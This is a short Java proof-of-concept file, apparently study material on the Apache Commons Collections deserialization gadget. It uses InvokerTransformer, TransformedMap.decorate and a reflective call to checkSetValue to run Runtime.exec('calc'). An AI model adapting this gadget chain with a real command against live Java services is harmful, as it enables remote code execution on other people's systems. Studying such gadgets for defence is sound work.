package TransformMapCC;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

// 调用 decorate 方法
public class DecorateCalc {
    public static void main(String[] args) throws Exception{
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        Class<TransformedMap> transformedMapClass = TransformedMap.class;
        Method checkSetValueMethod = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
        checkSetValueMethod.setAccessible(true);
        checkSetValueMethod.invoke(decorateMap, runtime);
    }
}
